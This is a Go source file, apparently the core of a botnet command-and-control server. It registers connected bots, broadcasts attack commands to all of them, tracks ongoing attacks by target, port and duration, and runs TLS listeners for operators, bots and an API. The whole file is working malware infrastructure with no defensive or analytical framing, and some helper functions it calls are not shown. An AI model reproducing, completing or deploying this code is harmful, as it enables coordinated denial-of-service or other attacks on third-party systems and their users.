package main

import (
	"crypto/tls"
	"fmt"
	"log"
	"net"
	"os"
	"os/signal"
	"sync"
	"syscall"
	"time"
)

var (
	bots = newBotReg()
	pool = newConnPool(capPool)

	liveAttacks = make(map[net.Conn]attack)
	atkMu       sync.Mutex

	apiAttacks = make(map[string]attack)
	apiAtkMu   sync.RWMutex

	history []attack
	histMu  sync.Mutex

	connectedUsers []*userConn
	clientsMu      sync.RWMutex

	connLimiter = make(chan struct{}, capConns)
	semaphore   = make(chan struct{}, 100)
)

func broadcast(cmd cmdPayload) {
	raw := cmdToBytes(cmd)
	p := mkPacket(pktCmd, raw)
	enc, err := encodePkt(p)
	if err != nil {
		return
	}
	all := bots.All()
	for _, c := range all {
		go func(conn net.Conn) {
			conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
			conn.Write(enc)
		}(c)
	}
}

func allOngoing() []attack {
	var out []attack
	atkMu.Lock()
	for _, a := range liveAttacks {
		if time.Now().Before(a.started.Add(a.dur)) {
			out = append(out, a)
		}
	}
	atkMu.Unlock()
	apiAtkMu.RLock()
	for _, a := range apiAttacks {
		if time.Now().Before(a.started.Add(a.dur)) {
			out = append(out, a)
		}
	}
	apiAtkMu.RUnlock()
	return out
}

func trackAPIAttack(a attack) {
	apiAtkMu.Lock()
	apiAttacks[a.target+":"+a.port] = a
	apiAtkMu.Unlock()
	go func() {
		time.Sleep(a.dur)
		apiAtkMu.Lock()
		delete(apiAttacks, a.target+":"+a.port)
		apiAtkMu.Unlock()
	}()
}

func updateTitles() {
	for {
		time.Sleep(10 * time.Second)
		clientsMu.RLock()
		cnt := botCount()
		for _, uc := range connectedUsers {
			setTermTitle(uc.conn, fmt.Sprintf("Bots: %d | User: %s", cnt, uc.acct.Username))
		}
		clientsMu.RUnlock()
	}
}

func handleUser(c *tls.Conn) {
	defer c.Close()
	ip := c.RemoteAddr().(*net.TCPAddr).IP.String()
	if !checkConnLimit(ip) {
		c.Write([]byte("\033[0;31m[!] too many connections\033[0m\r\n"))
		return
	}
	defer releaseConn(ip)

	ok, uc := doLogin(c)
	if !ok || uc == nil {
		return
	}

	clientsMu.Lock()
	connectedUsers = append(connectedUsers, uc)
	clientsMu.Unlock()
	defer func() {
		clientsMu.Lock()
		for i, u := range connectedUsers {
			if u == uc {
				connectedUsers = append(connectedUsers[:i], connectedUsers[i+1:]...)
				break
			}
		}
		clientsMu.Unlock()
	}()

	logUsr("INFO", uc.acct.Username, "connected", ip, nil)
	cmdLoop(c, uc)
	logUsr("INFO", uc.acct.Username, "disconnected", ip, nil)
}

func main() {
	initTokens()
	setupLogger(logsDir)
	if err := loadACL(); err != nil {
		log.Fatalf("acl: %v", err)
	}
	setupThrottle()

	go updateTitles()
	go scheduleDiags()
	go runPulseCheck()
	go gcQuotas()
	go gcLoginAttempts()
	go gcConnCounts()
	pool.StartGC(30 * time.Second)

	cert, err := tls.LoadX509KeyPair(certFile, keyFile)
	if err != nil {
		log.Fatalf("cert: %v", err)
	}
	tc := &tls.Config{
		Certificates: []tls.Certificate{cert},
		MinVersion:   tls.VersionTLS13,
	}

	api := newAPISrv(listenAPI)
	go api.Start()

	uln, err := tls.Listen("tcp", listenUser, tc)
	if err != nil {
		log.Fatalf("user listen: %v", err)
	}
	go func() {
		for {
			c, err := uln.Accept()
			if err != nil {
				continue
			}
			go handleUser(c.(*tls.Conn))
		}
	}()

	bln, err := tls.Listen("tcp", listenBot, tc)
	if err != nil {
		log.Fatalf("bot listen: %v", err)
	}
	go func() {
		for {
			c, err := bln.Accept()
			if err != nil {
				continue
			}
			go handleBot(c.(*tls.Conn))
		}
	}()

	log.Printf("cnc up | users=%s bots=%s api=%s", listenUser, listenBot, listenAPI)

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	<-sig

	log.Println("shutting down")
	uln.Close()
	bln.Close()
	pool.Shutdown()
}
